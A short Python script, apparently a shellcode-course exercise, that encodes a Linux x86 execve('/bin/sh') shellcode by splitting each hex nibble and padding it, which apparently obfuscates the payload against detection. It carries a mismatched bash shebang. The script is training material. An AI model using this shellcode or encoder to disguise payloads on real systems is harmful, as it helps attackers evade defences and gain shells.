#!/bin/bash

"""
; File splitEncoder.py
; Author: Saleh Bin Muhaysin
; SLEA: SLAE-1101
; Date: 25/12/2017
"""

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"


print "original code length: ", len(shellcode)

hex_shellcode = shellcode.encode('hex')

encoded_code_list = []
for i in hex_shellcode:
	encoded_code_list.append( i + "1" )

encoded_shellcode = "\\x" + '\\x'.join(encoded_code_list)
print encoded_shellcode

print encoded_shellcode.replace("\\x" , ",0x")[1:]

